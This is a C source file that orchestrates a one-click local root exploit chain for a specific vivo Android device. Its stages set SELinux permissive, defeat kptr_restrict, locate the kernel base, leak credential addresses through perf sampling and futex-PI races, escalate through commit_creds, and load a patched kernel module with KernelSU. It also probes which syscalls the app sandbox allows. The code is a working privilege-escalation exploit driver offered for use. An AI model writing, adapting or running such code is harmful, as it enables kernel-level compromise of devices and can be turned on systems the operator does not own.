/*
 * SPDX-License-Identifier: Apache-2.0
 * Copyright 2026 GhostLock-X200-App contributors
 *
 * runner.c — 设备端一键 root 编排器（离线验证版）。
 *
 * 用法：
 *   runner <work> <tag>                完整 STAGE1..7
 *   runner <work> <tag> --self-test [<kallsyms_file>]   门禁/解析单测
 *
 * work = payload 解压目录（含 glt_esync/w2host/ksud 等资产）。
 * 全程不改系统分区；只有 STAGE6 通过 rootcmd(被提权 w2host) 落位 /data/adb/ksud
 * 与 insmod 内核模块 —— 与主项目 root.ps1 行为一致。
 */
#include "runner.h"
#include "devices.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>   /* CLOCK_MONOTONIC（host gcc 需显式；bionic 间接带入） */

static int ksym_path_is_proc(const char *p);

/* ---- diag（真机环境诊断：app 进程权限点探测，不触发提权） ---- */
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <linux/perf_event.h>

static void diag_read(const char *label, const char *path) {
    char buf[256] = {0};
    int fd = open(path, O_RDONLY);
    if (fd < 0) { LOG("DIAG %s: open FAIL (%s)", label, strerror(errno)); return; }
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n < 0) { LOG("DIAG %s: read FAIL (%s)", label, strerror(errno)); return; }
    buf[n] = 0;
    char *nl = strchr(buf, '\n'); if (nl) *nl = 0;
    LOG("DIAG %s: OK '%s'", label, buf);
}

static void diag_perf(void) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    long fd = syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
    if (fd < 0) {
        LOG("DIAG perf_event_open: FAIL errno=%d (%s)  <- glt/w2host 依赖 perf 采样窗口",
            errno, strerror(errno));
    } else {
        LOG("DIAG perf_event_open: OK fd=%ld", fd);
        close((int)fd);
    }
}

/* ---- seccomp/syscall 探针（app 域实测竞速依赖 syscall 是否被沙箱拦） ---- */
#include <sys/wait.h>
#include <linux/futex.h>

static void probe_run(long (*fn)(void), const char *label) {
    pid_t pid = fork();
    if (pid == 0) {
        long r = fn();
        int code;
        if (r == 0) code = 0;
        else if (r == -1) code = 100 + (errno & 0x7f);
        else code = (int)(r & 0xff);
        _exit(code);
    }
    int st = 0;
    waitpid(pid, &st, 0);
    if (WIFSIGNALED(st)) {
        LOG("DIAG %-26s SIGNAL %d  <- 被杀(可能 seccomp RET_KILL)", label, WTERMSIG(st));
    } else {
        int c = WEXITSTATUS(st);
        if (c == 0) LOG("DIAG %-26s OK rc=0", label);
        else if (c >= 100) LOG("DIAG %-26s errno=%d (%s)", label, c - 100, strerror(c - 100));
        else LOG("DIAG %-26s rc=%d", label, c);
    }
}
static long p_futex_cmp_req_pi(void) {
    /* 两个有效 futex 地址；uaddr2 是 PACKET 里的 waiter 槽（不可达则在 pipe 中持有者等待） */
    static int u[8][2]; /* 8 对 futex，模拟真实 PACKET 缓冲区 */
    static int init_done;
    if (!init_done) { memset(u, 0, sizeof(u)); init_done = 1; }
    /* FUTEX_CMP_REQUEUE_PI(u1,1,NULL,u2,&u[1][1],0)：u1 无 waiter 时返 EAGAIN=11=正常 */
    return syscall(SYS_futex, &u[0][0], FUTEX_CMP_REQUEUE_PI, 1, NULL, &u[0][1], 0);
}
static long p_futex_lock_pi(void) {
    int u = 0;
    return syscall(SYS_futex, &u, FUTEX_LOCK_PI, 1, NULL, NULL, 0);
}
static long p_sched_setaffinity(void) {
    unsigned long m = 1; /* CPU0 */
    return syscall(SYS_sched_setaffinity, 0, sizeof(m), &m);
}
static long p_sched_setparam(void) {
    /* bionic sched.h 未定义 struct sched_param；sched_param 首成员=int sched_priority，用字节数组等价 */
    int sp[2] = {0, 0};
    return syscall(SYS_sched_setparam, 0, sp);
}
static long p_timerfd_create(void) {
    return syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
}
static long p_sched_setattr(void) {
    /* glt 主链真用 sched_setattr_tid→SYS_sched_setattr(SCHED_BATCH)。sched_attr 布局(bionic ktime)：
       size::u32, sched_policy::u32, sched_flags::u64, sched_nice::s32, ..., size 须>=SCHED_ATTR_MIN_SIZE(48) */
    char attr[64]; memset(attr, 0, sizeof(attr));
    *(unsigned long*)&attr[0]  = 48;   /* size */
    *(int*)&attr[8]            = 3;     /* sched_policy = SCHED_BATCH(3) */
    *(long*)&attr[16]          = 0;     /* sched_flags */
    *(int*)&attr[24]           = 0;     /* sched_nice */
    return syscall(SYS_sched_setattr, 0, attr, 0);
}
static long p_prctl_rseq(void) {
#ifndef PR_SET_PROCESS_RSEQ
#define PR_SET_PROCESS_RSEQ 0x42 /* 66; linux/prctl.h glibc 通常未导出 */
#endif
    prctl(PR_SET_PROCESS_RSEQ, 1);   /* 开启注册兴趣(无 rseq 头返回 -1 ENOSYS) */
    return prctl(PR_SET_PROCESS_RSEQ, 0); /* 关闭 */
}
static long p_rseq(void) {
    /* 非法地址 rseq 注册：若被 seccomp 拦→EPERM/SIGSYS；否则 EFAULT/EINVAL=允许 */
    return syscall(SYS_rseq, NULL, 0, 0, 0);
}
static void diag_syscalls(void) {
    LOG("DIAG start syscall probes (app seccomp sandbox)");
    probe_run(p_futex_cmp_req_pi, "futex FUTEX_CMP_REQUEUE_PI");
    probe_run(p_futex_lock_pi, "futex FUTEX_LOCK_PI");
    probe_run(p_sched_setaffinity, "sched_setaffinity");
    probe_run(p_sched_setparam, "sched_setparam");
    probe_run(p_timerfd_create, "timerfd_create");
    probe_run(p_sched_setattr, "sched_setattr");
    probe_run(p_prctl_rseq, "prctl PR_SET_PROCESS_RSEQ");
    probe_run(p_rseq, "rseq (SYS_rseq)");
    LOG("DIAG probes done");
}

static int diag(const RunnerCfg *cfg) {
    LOG("DIAG start (work=%s bindir=%s)", cfg->work, cfg->bindir ? cfg->bindir : "(null)");
    LOG("DIAG uid=%d gid=%d", getuid(), getgid());
    diag_read("osrelease", "/proc/sys/kernel/osrelease");
    diag_read("kptr_restrict", "/proc/sys/kernel/kptr_restrict");
    diag_read("selinux_enforce", "/sys/fs/selinux/enforce");
    diag_read("kallsyms", "/proc/kallsyms");
    diag_perf();
    diag_syscalls();
    /* 二进制可执行性 */
    char b[512];
    if (cfg->bindir && cfg->bindir[0]) {
        snprintf(b, sizeof(b), "%s/libghostrunner.so", cfg->bindir);
        LOG("DIAG runner exec: %s", access(b, X_OK) == 0 ? "X_OK" : strerror(errno));
        snprintf(b, sizeof(b), "%s/libghostglt.so", cfg->bindir);
        LOG("DIAG glt exec: %s", access(b, X_OK) == 0 ? "X_OK" : strerror(errno));
    }
    LOG("DIAG done");
    return 0;
}

/* ---- self-test（离线验证：门禁/符号解析/capsym/patcher/GL 槽位） ---- */
static int self_test(const RunnerCfg *cfg) {
    LOG("SELF-TEST start");
    int fails = 0;

    /* 1. 门禁 */
    if (stage0_gate(cfg) == 0) LOG("  gate: PASS");
    else { LOG("  gate: FAIL (self-test on non-b57 host is informational)"); }

    /* 2. 符号解析 + capsym 筛选（用样例 kallsyms） */
    const char *ks = cfg->ksym_path ? cfg->ksym_path : "/proc/kallsyms";
    SymTab st;
    memset(&st, 0, sizeof(st));
    if (ksym_path_is_proc(ks)) {
        if (symtab_load_proc(&st) != 0) { LOG("  symtab: FAIL (proc)"); fails++; }
    } else {
        if (symtab_load(&st, ks) != 0) { LOG("  symtab: FAIL (%s)", ks); fails++; }
    }
    if (st.count > 0) {
        LOG("  symtab: %zu symbols parsed", st.count);
        uint64_t t = symtab_find(&st, "_text");
        LOG("  _text: 0x%llx", (unsigned long long)t);
        uint64_t cs = symtab_capsym(&st, t ? t : DEV_PHYSMAP_BASE);
        LOG("  capsym(kbase=0x%llx): 0x%llx", (unsigned long long)t, (unsigned long long)cs);
        uint64_t cc = symtab_find(&st, "commit_creds");
        LOG("  commit_creds: 0x%llx", (unsigned long long)cc);
        if (t == 0) { LOG("  WARN: no _text in sample"); }
    } else {
        LOG("  symtab: empty");
    }

    /* 3. patcher（须在 symtab_free 之前）：patch clear_vr_tag.ko 样例，
     *    验证符号重定位（st_value + SHN_ABS）+ __versions 清空 */
    {
        char src[512], dst[512];
        snprintf(src, sizeof(src), "%s/clear_vr_tag.ko", cfg->work);
        snprintf(dst, sizeof(dst), "%s/clear_vr_tag.stest.ko", cfg->work);
        if (access(src, R_OK) == 0) {
            int w = patch_ko(src, dst, &st);
            LOG("  patch_ko(clear_vr_tag): %s (wrote %d syms)",
                w >= 0 ? "PASS" : "FAIL", w >= 0 ? w : -1);
        } else {
            LOG("  patch_ko: skipped (no clear_vr_tag.ko in work)");
        }
    }
    symtab_free(&st);

    /* 4. GL 槽位（boot_id 轮换逻辑） */
    char lock[64];
    for (int i = 0; i < 3; i++) {
        const char *l = gl_lock_next(cfg->work, lock, sizeof(lock));
        LOG("  gl_lock[%d]: %s", i, l ? l : "(null)");
    }

    LOG("SELF-TEST %s (%d fail(s))", fails ? "FAIL" : "done", fails);
    return fails ? 1 : 0;
}

static int ksym_path_is_proc(const char *p) {
    return p && strcmp(p, "/proc/kallsyms") == 0;
}

static void usage(const char *a0) {
    fprintf(stderr,
        "usage: %s <work> <tag> [bindir [--manager package]] | --self-test [kallsyms_file]\n"
        "  work: payload 目录（glt_esync/w2host/ksud 等资产）\n"
        "  tag : 本次运行标识（用于 socket/日志命名）\n",
        a0);
}

static void begin_stage(const RunnerCfg *cfg, int index) {
    char event[32];
    snprintf(event, sizeof(event), "stage-%d/start", index);
    runner_event(cfg, event, 0);
    LOG("UI_STAGE START %d", index);
}

static int finish_stage(const RunnerCfg *cfg, int index, int result) {
    char event[32];
    snprintf(event, sizeof(event), "stage-%d/end", index);
    runner_event(cfg, event, result);
    return result;
}

int main(int argc, char **argv) {
    if (argc < 3) { usage(argv[0]); return 2; }
    RunnerCfg cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.work = argv[1];
    cfg.tag = argv[2];
    cfg.self_test = 0;
    cfg.bindir = NULL;
    cfg.ksym_path = NULL;

    if (argc >= 4 && strcmp(argv[3], "--self-test") == 0) {
        cfg.self_test = 1;
        if (argc >= 5) cfg.ksym_path = argv[4];
        return self_test(&cfg);
    }

    /* --diag：环境诊断（app 进程权限点探测，不触发提权） */
    if (argc >= 4 && strcmp(argv[3], "--diag") == 0) {
        if (argc >= 5) cfg.bindir = argv[4];
        return diag(&cfg);
    }

    /* 可选第 4 参：可执行二进制目录（nativeLibraryDir）。
     * 缺省回退到 work（与旧调用兼容）。 */
    if (argc >= 4) cfg.bindir = argv[3];

    if (argc > 4) {
        if (argc != 6 || strcmp(argv[4], "--manager") != 0 ||
            (strcmp(argv[5], "me.weishu.kernelsu") != 0 &&
             strcmp(argv[5], "com.sukisu.ultra") != 0 &&
             strcmp(argv[5], "com.resukisu.resukisu") != 0)) {
            usage(argv[0]);
            return 2;
        }
        cfg.manager_package = argv[5];
        LOG("MANAGER selected: %s", cfg.manager_package);
    }

    LOG("=== GhostLock X200 runner tag=%s work=%s ===", cfg.tag, cfg.work);
    LOG("device: %s", DEV_KERNEL_RELEASE);

    /* 前置：SELinux 现状（不关 SELinux 是本项目红线，全程不 touch /sys/fs/selinux） */
    int en = getenforce_permissive();
    LOG("SELinux: %s", en == 1 ? "Permissive" : en == 0 ? "Enforcing" : "unknown");
    LOG("seccomp: %d (%s)", process_has_seccomp(),
        process_has_seccomp() ? "zygote app 过滤器" : "无过滤器");
    begin_stage(&cfg, 0);
    if (finish_stage(&cfg, 0, stage0_gate(&cfg)) != 0) return 1;

    if (getuid() == 0 && geteuid() == 0) {
        LOG("ROOT_SESSION: runner uid=0; skip temporary-root exploit stages");
        begin_stage(&cfg, 7);
        if (finish_stage(&cfg, 8, stage_root_session(&cfg)) != 0) return 1;
        LOG("=== ALL STAGES PASS ===");
        return 0;
    }

    begin_stage(&cfg, 1);
    if (finish_stage(&cfg, 1, stage1_permissive(&cfg)) != 0) return 1;
    begin_stage(&cfg, 2);
    if (finish_stage(&cfg, 2, stage2_kptr(&cfg)) != 0) return 1;

    SymTab ksym;
    memset(&ksym, 0, sizeof(ksym));
    begin_stage(&cfg, 3);
    if (finish_stage(&cfg, 3, stage3_base(&cfg, &ksym)) != 0) { symtab_free(&ksym); return 1; }

    begin_stage(&cfg, 4);
    if (finish_stage(&cfg, 4, stage4_quiesce(&cfg)) != 0) { symtab_free(&ksym); return 1; }

    char cands[16][64];
    memset(cands, 0, sizeof(cands));
    /* STAGE4+5 泄漏重试（PC 原版 3 ROUND + 手机端实测放宽到 10 ROUND）：
     * w2host perf 采样泄漏 cred 偶发无效/漂移（2026-08-29 shell9/10/11 实证：
     * 每轮 cred pool n=1 但地址在 slab 页内漂移 0x540/0xc00/0x6c0/0x9c0，
     * 3 轮交集为空 → inter n=0）。手机端系统 loadavg 15+（vivo 后台繁忙），
     * CPU0 采样窗口被其他进程 getuid 污染；shell_run7 成功泄漏过
     * 0xffffff822696f480（概率性）。PC 版注释：「手动 4 次全成功证明链路
     * 本身稳定，失败是 cred 候选质量问题」。多轮重试直到采样稳定。 */
    int leak_ok = 0;
    begin_stage(&cfg, 5);
    for (int rr = 0; rr < 10 && !leak_ok; rr++) {
        int result = stage4_leak(&cfg, (char *)cands, sizeof(cands));
        char event[48];
        snprintf(event, sizeof(event), "stage-5/round-%d", rr + 1);
        runner_event(&cfg, event, result);
        if (result == RUNNER_CLEANUP_FAILED) {
            LOG("PROCESS_CLEANUP FAIL: worker still active; further rounds cancelled");
            symtab_free(&ksym);
            return 1;
        }
        if (result != 0) {
            LOG("STAGE4/5 ROUND %d: leak FAIL, retry", rr + 1);
            continue;
        }
        leak_ok = 1;
    }
    if (!leak_ok) {
        symtab_free(&ksym);
        LOG("STAGE4 FAIL: 10 rounds no candidates");
        return 1;
    }

    finish_stage(&cfg, 5, 0);
    begin_stage(&cfg, 6);
    if (finish_stage(&cfg, 6, stage5_capsroot(&cfg, &ksym, (const char *)cands)) != 0) {
        symtab_free(&ksym);
        return 1;
    }

    begin_stage(&cfg, 7);
    if (finish_stage(&cfg, 7, stage6_insmod(&cfg, &ksym)) != 0) {
        symtab_free(&ksym);
        return 1;
    }
    symtab_free(&ksym);

    begin_stage(&cfg, 8);
    if (finish_stage(&cfg, 8, stage7_verify(&cfg)) != 0) return 1;

    LOG("=== ALL STAGES PASS ===");
    return 0;
}
